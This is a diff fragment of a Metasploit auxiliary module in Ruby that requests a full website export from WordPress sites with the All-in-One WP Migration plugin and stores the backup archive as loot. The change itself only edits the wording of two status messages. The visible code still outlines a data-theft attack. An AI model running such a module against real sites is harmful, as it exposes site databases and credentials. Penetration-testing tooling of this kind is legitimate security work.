@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Requesting website export...")
+    print_status("Requesting website export...")
     res = send_request_cgi(
       {
         'method'    => 'POST',
@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status("it does not allow WRITE permission to the all-in-one-wp-migration/storage directory.")
     else
       store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')
-      print_good("#{peer} - Backup archive saved to #{store_path}")
+      print_good("Backup archive saved to #{store_path}")
     end
   end
 end
